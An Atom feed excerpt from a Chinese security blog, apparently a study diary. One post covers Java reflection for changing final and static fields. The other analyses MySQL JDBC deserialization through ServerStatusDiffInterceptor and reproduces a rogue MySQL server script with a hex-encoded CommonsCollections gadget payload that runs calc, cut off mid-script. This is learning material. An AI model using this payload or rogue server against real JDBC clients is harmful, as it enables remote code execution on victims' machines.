    <link href="https://clowsman.github.io/2024/10/04/%E5%8F%8D%E5%B0%84%E4%BF%AE%E6%94%B9%E5%8F%98%E9%87%8F/"/>
    <id>https://clowsman.github.io/2024/10/04/%E5%8F%8D%E5%B0%84%E4%BF%AE%E6%94%B9%E5%8F%98%E9%87%8F/</id>
    <published>2024-10-04T03:25:10.000Z</published>
    <updated>2024-10-04T03:26:39.492Z</updated>
    
    <content type="html"><![CDATA[<h1 id="低版本修改final和static"><a href="#低版本修改final和static" class="headerlink" title="低版本修改final和static"></a>低版本修改final和static</h1><p>参考文章：<a href="https://www.cnblogs.com/noKing/p/9038234.html">https://www.cnblogs.com/noKing/p/9038234.html</a></p><h2 id="修改static变量"><a href="#修改static变量" class="headerlink" title="修改static变量"></a>修改static变量</h2><p>这里和正常修改普通变量一样都是没问题的</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String str=<span class="hljs-string">&quot;ceshi&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br>        <span class="hljs-comment">//修改static变量</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;str&quot;</span>);<br>        str1.setAccessible(<span class="hljs-literal">true</span>);<br>        str1.set(test1,<span class="hljs-string">&quot;ceshi1&quot;</span>);<br>        System.out.println(Test1.str);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125754.png" alt="image-20241004100135810"></p><h2 id="修改final变量"><a href="#修改final变量" class="headerlink" title="修改final变量"></a>修改final变量</h2><p>这里有点不同</p><p>我们修改StringBuilder变量</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default2&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br>        <span class="hljs-comment">//修改final的变量</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        name1.setAccessible(<span class="hljs-literal">true</span>);<br>        name1.set(test1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;ceshi3&quot;</span>));<br>        System.out.println(test1.name);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125725.png" alt="image-20241004100649459"></p><p>看到是可以修改成功的</p><p>但是如果我们修改String变量会发现修改不成功，这是因为String类型的final变量，在优化时会将其变成常量，比如下面的System.out.println(test1.STR1);就会变成System.out.println(“test”);，所以其实赋值是成功了的，但是因为打印变成常量了所以没变化，我们可以用反射拿出值来验证一下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String str=<span class="hljs-string">&quot;ceshi&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String STR1=<span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default2&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br>        <span class="hljs-comment">//修改final的String变量</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;STR1&quot;</span>);<br>        str11.setAccessible(<span class="hljs-literal">true</span>);<br>        str11.set(test1,<span class="hljs-string">&quot;ceshi2&quot;</span>);<br>        System.out.println(test1.STR1);<br>        System.out.println(str11.get(test1));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125750.png" alt="image-20241004100943421"></p><p>可以看到确实是没问题的</p><p>那我们想要修改final变量就需要防止String类型变量在编译时被处理为常量，方法就是让其值的初始化经过运算才能得到，我们代码可以改成这样</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String STR1=(<span class="hljs-literal">null</span> == <span class="hljs-literal">null</span> ? <span class="hljs-string">&quot;default4&quot;</span> : <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String STR2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default5&quot;</span>).toString();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br><br>        <span class="hljs-comment">//修改final的String变量</span><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;STR1&quot;</span>);<br>        str11.setAccessible(<span class="hljs-literal">true</span>);<br>        str11.set(test1,<span class="hljs-string">&quot;ceshi5&quot;</span>);<br>        System.out.println(test1.STR1);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;STR2&quot;</span>);<br>        str2.setAccessible(<span class="hljs-literal">true</span>);<br>        str2.set(test1,<span class="hljs-string">&quot;ceshi6&quot;</span>);<br>        System.out.println(test1.STR2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125726.png" alt="image-20241004101525466"></p><p>这两种方法我们都可以防止其被常量化</p><h2 id="修改同时被final和static修饰的变量"><a href="#修改同时被final和static修饰的变量" class="headerlink" title="修改同时被final和static修饰的变量"></a>修改同时被final和static修饰的变量</h2><p>此时通过常规反射的写法就会报错，如果我们要修改的话就需要先去除final修饰符才行</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default7&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br><br>        <span class="hljs-comment">//反射同时修改static和final修饰的变量</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;name1&quot;</span>);<br>        name11.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">modifiers</span> <span class="hljs-operator">=</span> name11.getClass().getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<span class="hljs-comment">//获取modifiers字段</span><br>        modifiers.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<span class="hljs-comment">//去除final修饰符</span><br>        name11.set(test1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;ceshi7&quot;</span>));<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<span class="hljs-comment">//将final修饰符设置回来</span><br>        System.out.println(test1.name1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>用modifiers字段去除final修饰符即可修改。</p><blockquote><p> <code>Field</code> 类中的 <code>modifiers</code> 字段。这个字段是一个 <code>int</code> 类型的值，表示该字段的修饰符（如 <code>public</code>、<code>private</code>、<code>final</code> 等），该字段是一个私有字段。</p><p><code>Modifier.FINAL</code> 是一个常量，表示 <code>final</code> 修饰符的位掩码。</p></blockquote><h1 id="高版本修改final和static"><a href="#高版本修改final和static" class="headerlink" title="高版本修改final和static"></a>高版本修改final和static</h1><p>其他的反射修改都没有变化，就是修改同时被final和static修饰的变量的方法从Java12开始失效了，我在java17测试是直接没有modifiers这个字段了。这是因为高版本下不能通过getDeclaredFiled获取Field的属性。</p><p>这一点可以从fieldFilterMap里面知道</p><p><img src="https://cdn.clown2024.cn/202410041125763.png" alt="image-20241004105355114"></p><p>图中被过滤的类都不能直接通过公共反射获取他们的属性了，我们的Field类就在其中。</p><p>那就需要改一改方法了，这种方法对java8-java17都是适用的，参考文章：<a href="https://blog.csdn.net/wu_weijie/article/details/129251045">https://blog.csdn.net/wu_weijie/article/details/129251045</a></p><p>我们可以改成用<strong>getDeclaredFields0</strong>方法来获取，从文章中可以知道他能返回一个Field数组对象，里面就包含了我们的modifiers属性</p><p>那我们的修改代码就可以改成下面这样：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default7&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br><br>        <span class="hljs-comment">//高版本反射同时修改static和final修饰的变量</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getDeclaredFields0</span> <span class="hljs-operator">=</span> Class.class.getDeclaredMethod(<span class="hljs-string">&quot;getDeclaredFields0&quot;</span>, <span class="hljs-type">boolean</span>.class);<br>        getDeclaredFields0.setAccessible(<span class="hljs-literal">true</span>);<br>        Field[] fields = (Field[]) getDeclaredFields0.invoke(Field.class, <span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">modifiers</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">for</span> (Field each : fields) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;modifiers&quot;</span>.equals(each.getName())) &#123;<br>                modifiers = each;<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;name1&quot;</span>);<br>        name11.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiers.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<br>        name11.set(test1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;ceshi7&quot;</span>));<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<br>        System.out.println(test1.name1);<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们运行的时候还需要添加模块，因为java12的高版本是模块化的，在vm-options添加修改即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">--add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.lang.reflect=ALL-UNNAMED<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;低版本修改final和static&quot;&gt;&lt;a href=&quot;#低版本修改final和static&quot; class=&quot;headerlink&quot; title=&quot;低版本修改final和static&quot;&gt;&lt;/a&gt;低版本修改final和static&lt;/h1&gt;&lt;p&gt;参考文章：&lt;a hr</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="基础" scheme="https://clowsman.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Mysql-JDBC反序列化</title>
    <link href="https://clowsman.github.io/2024/09/24/Mysql-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/09/24/Mysql-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-09-24T15:07:50.000Z</published>
    <updated>2024-10-03T01:36:00.557Z</updated>
    
    <content type="html"><![CDATA[<p>来学一下常见的JDBC反序列化，是MYSQL的，参考文章：<a href="https://tttang.com/archive/1877/">https://tttang.com/archive/1877/</a></p><h1 id="jdbc简单介绍"><a href="#JDBC简单介绍" class="headerlink" title="JDBC简单介绍"></a>JDBC简单介绍</h1><p>一个简单的查询demo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//加载驱动</span><br>        Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>        <span class="hljs-comment">//建立连接,可能要设置一下时区，可以设置为上海</span><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/test?serverTimezone=Asia/Shanghai&amp;&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root123&quot;</span>);<br>        <span class="hljs-comment">//操作数据库执行增删改查</span><br>        <span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.createStatement();<br>        <span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> statement.executeQuery(<span class="hljs-string">&quot;select * from ceshi&quot;</span>);<br>        <span class="hljs-keyword">while</span> (resultSet.next()) &#123;<br>            System.out.println(resultSet.getString(<span class="hljs-string">&quot;name&quot;</span>));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>若攻击者能控制JDBC连接设置项，则可以通过设置其配置指向恶意MySQL服务器触发ObjectInputStream.readObject()，构造反序列化利用链从而造成RCE。<br>通过JDBC连接MySQL服务端时，会有几句内置的查询语句需执行，其中两个查询的结果集在MySQL客户端进行处理时会被ObjectInputStream.readObject()进行反序列化处理。如果攻击者可以控制JDBC连接设置项，那么可以通过设置其配置指向恶意MySQL服务触发MySQL JDBC客户端的反序列化漏洞。<br>可被利用的两条查询语句：</p><ul><li><p>SHOW SESSION STATUS</p><p>此语句用于显示当前会话的状态信息。它提供了一系列关于会话级别的统计信息和变量的值，这些信息可以帮助开发者和数据库管理员了解当前会话的性能和行为。</p></li><li><p>SHOW COLLATION</p><p>此语句用于显示当前数据库中可用的字符集和排序规则（collation）。排序规则定义了如何比较和排序字符串。</p></li></ul><h1 id="serverstatusdiffinterceptor利用链"><a href="#ServerStatusDiffInterceptor利用链" class="headerlink" title="ServerStatusDiffInterceptor利用链"></a>ServerStatusDiffInterceptor利用链</h1><p>参考文章：<a href="https://xz.aliyun.com/t/8159?time__1311=n4+xnD0Dc7GQDtY40KDsA3xCTTNrKhK3DgAmoD">https://xz.aliyun.com/t/8159?time__1311=n4%2BxnD0Dc7GQDtY40KDsA3xCTTNrKhK3DgAmoD</a></p><p>这里的环境如下</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>cc是为了用来触发反序列化的</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>首先我们的任务就是找包内有哪个类的方法里面有readObject函数，链子的作者在挖掘的时候就找到了这个入口点<strong>com.mysql.cj.jdbc.result.ResultSetImpl.getObject()</strong></p><p><img src="https://cdn.clown2024.cn/202410011740099.png" alt="image-20241001173957942"></p><p>这里就存在readObject方法，那就需要像正常找链子一样往上找了</p><blockquote><p>这里只要我们在jdbc url中设置autoDeserialize为true就可以进入到readObject里面</p><p>-84和-19是序列化对象的前两个字节，用来标识数据是否为序列化对象</p></blockquote><p><img src="https://cdn.clown2024.cn/202410012303198.png" alt="image-20241001230233251"></p><p>这里可以找到ResultSetUtil这个类的resultSetToMap</p><p>然后再继续往上找</p><p><img src="https://cdn.clown2024.cn/202410012304030.png" alt="image-20241001230435900"></p><p>最终就找到了我们的<strong>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues</strong>方法，这里执行了我们的前面提到过的<strong>SHOW SESSION STATUS</strong>语句，然后将返回的结果传入resultSetToMap方法来调用</p><p>该类是一个拦截器，在JDBC URL中设定属性queryInterceptors为<code>ServerStatusDiffInterceptor</code>时，执行查询语句会调用拦截器的preProcess和postProcess方法，这两个方法里面都调用了populateMapWithSessionStatusValues方法</p><p><img src="https://cdn.clown2024.cn/202410012317524.png" alt="image-20241001231725481"></p><p>这样就构成了我们的触发条件了</p><p>那我们的攻击思路就是，要让<strong>SHOW SESSION STATUS</strong>返回的结果是一个恶意的序列化对象，我们就需要根据MySql协议的流量格式去写一个恶意的MySql服务器让客户端连接</p><p>我们可以起一个mysql的docekr容器然后去抓一下流量来分析</p><p><img src="https://cdn.clown2024.cn/202410012324338.png" alt="image-20241001232453239"></p><p>就用前面简单的例子执行一下抓一下过程即可，如上图</p><blockquote><p>抓本地回环包需要下载npcap才行</p></blockquote><p>比如Response OK</p><p><img src="https://cdn.clown2024.cn/202410012329473.png" alt="image-20241001232901372"></p><p>我们只需要返回这些数据即可</p><p>我们的攻击过程就是照抄流量包，按照返回的顺序返回给客户端即可，我们可以执行一条SHOW SESSION STATUS的查询跟着伪造一下</p><p>然后copy一下文章有关结果集数据包的结构</p><p><img src="https://cdn.clown2024.cn/202410012333975.png" alt="image-20241001233303908"></p><ul><li>数据段1：说明下面的结果集有多少列</li><li>数据段2：列的定义</li><li>数据段3： EOF 包</li><li>数据段4：行数据。</li></ul><h2 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h2><p>这里就直接copy师傅的poc了，读一读代码学习一下</p><p>恶意mysql服务</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment">#问候消息</span><br>greeting_data=<span class="hljs-string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span><br><span class="hljs-comment">#响应消息</span><br>response_ok_data=<span class="hljs-string">&quot;0700000200000002000000&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">receive_data</span>(<span class="hljs-params">conn</span>):<br>    data = conn.recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(data).lower()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_data</span>(<span class="hljs-params">conn,data</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br>    conn.send(binascii.a2b_hex(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_payload_content</span>():<br>    <span class="hljs-comment">#file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  &quot;calc&quot; &gt; a</span><br>    file= <span class="hljs-string">r&#x27;a&#x27;</span><br>    <span class="hljs-keyword">if</span> os.path.isfile(file):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            payload_content = <span class="hljs-built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;open successs&quot;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;open false&quot;</span>)<br>        <span class="hljs-comment">#calc</span><br>        payload_content=<span class="hljs-string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span><br>    <span class="hljs-keyword">return</span> payload_content<br><br><span class="hljs-comment"># 主要逻辑</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        conn, addr = sk.accept()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(addr[<span class="hljs-number">0</span>],addr[<span class="hljs-number">1</span>]))<br><br>        <span class="hljs-comment"># 1.先发送第一个 问候报文</span><br>        send_data(conn,greeting_data)<br><br>        <span class="hljs-keyword">while</span> <span 